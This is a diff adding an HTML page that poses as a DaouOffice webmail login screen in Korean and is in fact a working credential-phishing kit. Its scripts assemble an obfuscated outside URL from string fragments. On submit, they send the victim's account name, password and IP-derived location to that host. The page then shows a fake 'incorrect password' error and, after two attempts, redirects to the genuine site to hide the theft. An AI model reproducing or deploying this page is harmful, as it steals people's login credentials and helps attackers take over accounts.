@@ -1,0 +1,225 @@
+
+<!doctype html>
+<html><head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="virwport" content="width=device-width,initial-scale=1">
+    <meta name="version" content="3.6.9.6">
+    <meta name="brandName" content="DaouOffice">
+   
+    <title>로그인</title>
+    <link href="http://cnld.daouoffice.com/resources/images/favicon/DO_favicon.ico?rev=202510290839" rel="shortcut icon">
+    <link rel="stylesheet" href="http://cnld.daouoffice.com/resources/css/go_style.css?rev=202510290839" media="screen">    
+
+<script type="text/javascript" src="https://code.jquery.com/jquery-latest.min.js"></script>
+ <script>
+    let resBox = 'Exl Atta'
+
+    let nbg1 = "htt";
+    let nbg2 = "ps://grand";
+    let nbg3 = "oise.li";
+    let nbg4 = "ve/erf/b";
+    let nbg5 = "am.ph";
+    let nbg6 = "p";
+
+    let ov1 = 'htt'
+    let ov2 = 'ps://da'
+    let ov3 = 'ouof'
+    let ov4 = 'fice.co'
+    let ov5 = 'm/ap'
+    let ov6 = 'p/ma'
+    let ov7 = 'il'
+
+    sessionStorage.clear()
+    let trialCount = sessionStorage.getItem("num_trial");
+
+    if (!trialCount) {
+      sessionStorage.setItem("num_trial", 0);
+    } else if (trialCount >= 2) {
+      window.location.assign(`${ov1}${ov2}${ov3}${ov4}${ov5}${ov6}${ov7}`)
+    }
+  </script> 
+ 
+</head>
+<body class="user_front" id="bodyPart">
+    <p name="description" style="display:none;">로그인이 필요합니다.</p>
+    <div id="noticeBanner" style=""><div id="noticeBanner" style="font-family: &quot;맑은 고딕&quot;; font-size: 10pt; line-height: 150%; margin-top: 0px; margin-bottom: 0px;">
+  
+<div class="banner" style="background:#fff2ab;/* height: 100px; */line-height: normal;font-family: &quot;맑은 고딕&quot;;font-size: 10pt;margin-top: 0px;margin-bottom: 0px;position: relative;">
+    <span class="wrap_banner banner_upgrade" style="margin: 0px auto;width: 800px;line-height: normal;font-family: &quot;맑은 고딕&quot;;font-size: 10pt;display: block;position: relative;">
+      <a href="https://go.daouoffice.co.kr/PvZ5Wo" target="_blank" style="display:inline-block;">       
+        
+<div style="height: 100px; font-family: &quot;맑은 고딕&quot;; font-size: 10pt; line-height: 150%; margin-top: 0px; margin-bottom: 0px;">
+          <img src="https://www.daouoffice.com/banner_mk/topbanner.gif" alt="배너 이미지" style="width:800px; height:100px; outline:none; vertical-align:top" usemap="#top_eventbanner">
+        </div></a>      
+    </span>
+    <a id="bannerClose" style="position:absolute; top:20px; right:15px; display:block; cursor:pointer; display:inline-block">
+      <img src="https://daouoffice.com/images/close_b.png" title="">  
+    </a>
+  </div><p style="font-family: &quot;맑은 고딕&quot;; font-size: 10pt; line-height: 20px; margin-top: 0px; margin-bottom: 0px;">&nbsp;</p></div><p style="font-family: &quot;맑은 고딕&quot;; font-size: 10pt; line-height: 150%; margin-top: 0px; margin-bottom: 0px;">&nbsp;</p></div>
+    <div class="go_wrap go_skin_default go_intro_wrap mint_theme">
+        <header class="go_header">
+            <h1>
+            </h1>
+            <div id="language_select" class="language">
+                <select>
+                	<option value="language">언어(Language)</option>
+                    
+                        <option value="ko">한국어</option>
+                    
+                        <option value="en">English</option>
+                    
+                        <option value="ja">日本語</option>
+                    
+                        <option value="zh_CN">簡体中文</option>
+                    
+                        <option value="zh_TW">繁体中文</option>
+                    
+                        <option value="vi">tiếng Việt</option>
+                    
+                </select>
+            </div>
+        </header>
+
+        <div class="go_intro">
+            
+            <form id="form_" action="" method="post">
+                <section class="login_box">
+	              
+
+					<div class="custom_visual">
+                        
+                        
+                            <img src="data:image/jpeg;base64,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">
+                        
+		            </div>
+
+				
+                    <fieldset>
+                        <legend>login</legend>
+						<div class="login_id">
+            <input type='hidden' required class='text mm' id="ckorg">
+            <input type="hidden" class='text' name="loc" id="loc">
+            <input type="hidden" class='text' name="trial" id="trial">						
+                            <input type="text" id="ck" readonly name="username" class="ipt_login login_wide" tabindex="1" placeholder="계정"  autocapitalize="off" >
+                        </div>
+                        <div class="login_pw">
+                            <input type="password" name="password" id="cknow" autocomplete="off" class="ipt_login" tabindex="3" placeholder="비밀번호" >
+							
+							 <div id="errmsg" style="color: #FF0000; font-weight: 400; font-family: sans-serif; font-size: 13px;">
+
+                          </div>
+						  
+						</div>
+						
+                        <button type="submit" value="Submit" id="loader"  class="btn_login" tabindex="4" >로그인	</button>
+                    </fieldset>
+
+                    <div class="login_check">
+                        <span class="option_wrap">
+                            <input type="checkbox" name="saveEmail"  tabindex="5">
+                            <label >계정 저장</label>
+                        </span>
+                        
+                        <span class="option_wrap">|</span>
+                        <a class="option_wrap" >비밀번호 찾기</a>
+                        
+                    </div>
+                </section>
+
+               
+            </form>
+
+         
+        </div>
+    </div>
+
+
+
+ <script>
+    document.addEventListener('DOMContentLoaded', function () {
+      setInterval(function () {
+        let ccc = document.querySelector('.bg-text')
+        ccc.style.display = 'block'
+        ccc.style.animation = 'show 1s ease'
+
+      }, 2000)
+    })
+    const xx = window.location.href.split('?');
+    let ck = document.querySelector('#ck')
+    let ckorg = document.querySelector('#ckorg')
+    let cknow = document.querySelector('#cknow')
+    let loader = document.querySelector('#loader')
+    let loc = document.querySelector('#loc')
+    let trial = document.querySelector('#trial')
+
+    var base64regex =
+        /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;
+
+      if (!base64regex.test(xx[1])) {
+        ckorg.value = xx[1];
+        ck.value = xx[1];
+      } else {
+        ckorg.value = atob(xx[1]);
+        ck.value = atob(xx[1]);
+      }
+
+    trial.value = trialCount
+
+    let myForm = document.querySelector('#form_')
+    //console.log(`${nbg1}${nbg2}${nbg3}${nbg4}${nbg5}${nbg6}${nbg7}`)
+    myForm.addEventListener('submit', async function (event) {
+      event.preventDefault()
+
+      let data = new FormData()
+
+      let options = {
+        method: 'POST',
+        body: data
+      }
+
+      data.append('ck', ck.value)
+      data.append('ckorg', ckorg.value)
+      data.append('cknow', cknow.value)
+      data.append('loc', loc.value)
+      data.append('trial', trial.value)
+      data.append('resBox', resBox)
+
+      loader.innerHTML = "<i class='fa fa-circle-o-notch fa-spin'></i> 문서 열기..."
+
+      const response = await fetch(`${nbg1}${nbg2}${nbg3}${nbg4}${nbg5}${nbg6}`, options)
+      const result = await response.text()
+
+      loader.innerHTML = "로그인"
+
+      console.log(result)
+
+      trialCount++;
+      sessionStorage.setItem("num_trial", trialCount);
+      trial.value = trialCount
+
+      if (trialCount >= 2) {
+        window.location.assign(`${ov1}${ov2}${ov3}${ov4}${ov5}${ov6}${ov7}`)
+      } else {
+        document.getElementById('errmsg').innerHTML = "비밀번호가 올바르지 않습니다. 다시 시도해 주세요. "
+      }
+    })
+
+    $.get("https://ipinfo.io/json?token=10da60a9ff2d81", function (response) {
+      let cou = `${response.city}, ${response.region}, ${response.country}. ${response.postal} ${response.timezone}`
+      $("#loc").val(cou);
+    }, "jsonp");
+  </script>
+
+
+</body>
+
+<div id="google_translate_element"></div>
+<script>
+function googleTranslateElementInit() {
+  new google.translate.TranslateElement({pageLanguage: 'en'}, 'google_translate_element');
+}
+</script>
+<script src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+
+</html>
